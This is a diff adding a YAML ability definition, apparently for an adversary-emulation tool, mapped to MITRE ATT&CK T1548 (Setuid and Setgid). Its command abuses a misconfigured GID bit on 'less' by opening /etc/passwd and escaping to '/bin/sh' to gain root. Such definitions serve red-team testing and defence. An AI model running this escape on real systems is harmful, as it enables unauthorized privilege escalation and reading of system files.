@@ -1,0 +1,15 @@
+---
+
+- id: 60e64031-7a2c-4675-aabb-1d4bd5664894
+  name: Use of GID bit on less
+  description: Abuse a misconfigured GID to gain root access
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548
+    name: Setuid and SetGid
+  platforms:
+    linux:
+      sh:
+        command: |
+          less /etc/passwd;
+          !/bin/sh;
